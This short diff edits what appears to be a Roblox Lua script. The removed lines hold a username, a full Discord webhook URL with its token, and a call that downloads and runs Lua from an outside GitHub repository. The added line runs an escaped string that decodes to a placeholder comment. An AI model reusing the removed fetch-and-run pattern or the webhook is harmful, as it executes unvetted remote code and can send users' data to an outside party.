@@ -1,4 +1,1 @@
-UserName = "stonie_2020"
-WebHook = "https://discord.com/api/webhooks/1069589237667733576/NUsftva9TPD4SAnvgWJqlEMPgFut30_QjmbwnnBv8nJev810BZNSl7CbEr3R40o4tNgi"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()```
+loadstring("\45\45\32\80\117\116\32\115\99\114\105\112\116\32\104\101\114\101\10")()
